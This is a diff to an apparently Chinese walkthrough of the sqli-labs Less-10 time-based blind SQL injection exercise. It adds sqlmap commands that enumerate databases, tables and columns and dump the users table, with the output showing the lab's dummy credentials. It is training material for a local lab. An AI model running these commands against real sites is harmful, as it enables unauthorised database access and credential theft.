@@ -5,6 +5,7 @@ http://10.0.2.15/sqli/Less-10/?id=1"
 即无论正确还是错误，回显的文本都一样
 故采用基于时间的盲注（Less10与Less9唯一的区别就是Less10是基于“”号的，故把Less9中的脚本中'改为"即可，即把%27改为%22即可（Less10的脚本换了另一种方式写，与Less9有一些不同）
 
+方法一（自己编写脚本）：
 表名：
 users,uagents,emails,referers
 推测表名为users
@@ -16,3 +17,56 @@ id,username,password,user,current_connections,total_connections
 字段值：
 dumb:dumb,angelina:i-kill-you,dummy:p@ssword,secure:crappy,stupid:stupidity,superman:genious,batman:mob!le,admin:admin,admin1:admin1,admin2:admin2,admin3:admin3,dhakkan:dumbo,admin4:admin4
 
+方法二（使用sqlmap）：
+sqlmap -u "http://localhost/sqli/Less-10/?id=1" --technique T --dbs
+爆出数据库名
+available databases [5]:
+[*] challenges
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] security
+爆出表名
+sqlmap -u "http://localhost/sqli/Less-10/?id=1" --technique T -D security --tables --batch
+Database: security
+[4 tables]
++----------+
+| emails   |
+| referers |
+| uagents  |
+| users    |
++----------+
+sqlmap -u "http://localhost/sqli/Less-10/?id=1" --technique T -D security -T users --columns --batch
+爆出字段名
+Database: security
+Table: users
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| id       | int(3)      |
+| password | varchar(20) |
+| username | varchar(20) |
++----------+-------------+
+sqlmap -u "http://localhost/sqli/Less-10/?id=1" --technique T -D security -T users -C username,password --dump --batch
+爆出字段值
+Database: security
+Table: users
+[13 entries]
++----------+------------+
+| username | password   |
++----------+------------+
+| admin    | admin      |
+| admin1   | admin1     |
+| admin2   | admin2     |
+| admin3   | admin3     |
+| admin4   | admin4     |
+| secure   | crappy     |
+| Dumb     | Dumb       |
+| dhakkan  | dumbo      |
+| superman | genious    |
+| Angelina | I-kill-you |
+| batman   | mob!le     |
+| Dummy    | p@ssword   |
+| stupid   | stupidity  |
++----------+------------+
